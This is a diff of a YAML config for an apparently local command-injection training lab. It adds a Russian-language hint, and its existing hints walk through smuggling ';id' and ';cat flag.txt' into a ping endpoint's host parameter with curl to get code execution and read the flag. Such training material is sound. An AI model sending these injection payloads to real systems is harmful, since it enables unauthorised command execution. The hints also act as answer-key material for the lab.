@@ -20,6 +20,7 @@ lab:
   files: [task.md]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-injection-basics`): сначала baseline `curl -s 'http://shop.lab.local/ping?host=127.0.0.1'` — пойми нормальный вывод, потом добавляй разделитель."
     - Базовый запрос: `curl -s 'http://shop.lab.local/ping?host=127.0.0.1'` — сервер пингует хост.
     - Добавь разделитель: `;` (в URL закодируй). Удобно так: `curl -s -G http://shop.lab.local/ping --data-urlencode 'host=127.0.0.1;id'`.
     - Ты выполнил `id` — значит есть RCE. Прочитай файл: `--data-urlencode 'host=127.0.0.1;cat flag.txt'`.
